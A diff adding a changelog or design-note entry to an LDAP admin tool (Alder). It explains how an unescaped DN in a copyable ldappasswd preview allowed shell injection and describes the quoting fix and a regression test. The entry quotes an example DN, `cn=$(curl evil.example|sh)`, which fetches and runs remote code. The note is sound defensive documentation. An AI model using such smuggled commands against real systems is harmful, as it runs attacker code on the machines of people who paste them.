@@ -5545,3 +5545,19 @@ Alder sees is often not the one the browser used, so that check would
 refuse the proxy's own users. Sec-Fetch-Site is computed by the browser and
 survives any proxy. **Not a CSRF token** either: it would need a change to
 both clients and the contract for a hole these two checks close.
+
+### 2026-10-12 — the ldappasswd line is quoted for a shell
+
+A password change has no LDIF, so its preview shows the equivalent
+`ldappasswd ... -S <dn>` to copy. The DN went in bare. RFC 4514 escaping
+is about DNs, not shells: it leaves `$`, backticks, parentheses, `|` and
+`&` alone, so an entry named `cn=$(curl evil.example|sh)` produced a line
+that ran a command on the machine of whoever pasted it -- and the person
+resetting a password is rarely the one who named the entry. A test that
+feeds the rendered line to `sh` created a file on disk before the fix.
+
+The DN is now single-quoted with the same function the ldapsearch line has
+always used, moved to `directory.ShellQuote` so there is one, and
+`$LDAP_URI` is double-quoted beside `$BIND_DN` for the same reason. The
+Ansible export was checked and is not affected: its one shell task takes
+the LDIF on standard input.
